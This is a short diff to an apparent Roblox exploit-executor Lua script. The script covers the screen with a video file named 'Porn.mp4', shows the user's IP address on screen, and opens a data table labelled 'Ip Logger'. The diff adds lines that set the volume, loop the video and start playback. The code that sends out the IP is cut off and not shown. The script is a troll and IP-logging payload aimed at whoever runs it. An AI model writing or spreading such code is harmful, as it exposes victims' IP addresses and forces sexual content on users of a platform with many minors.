@@ -24,12 +24,16 @@ MADEBYHERACLIOUS.ResetOnSpawn = false
 local Troll = Instance.new("VideoFrame",MADEBYHERACLIOUS)
 Troll.Size = UDim2.new(1,0,1,0)
 Troll.Video = syn and getsynasset("Porn.mp4") or getcustomasset("Porn.mp4")
+Troll.Volume = 50
+Troll.Looped = true
 
 local string = Instance.new("TextLabel",Troll)
 string.Text = tostring(IP)
 string.Size = UDim2.new(1,0,0.1,0)
 
 repeat wait() until Troll.Loaded
+
+Troll:Play()
 
 local data = {
     ["username"] = "Ip Logger",
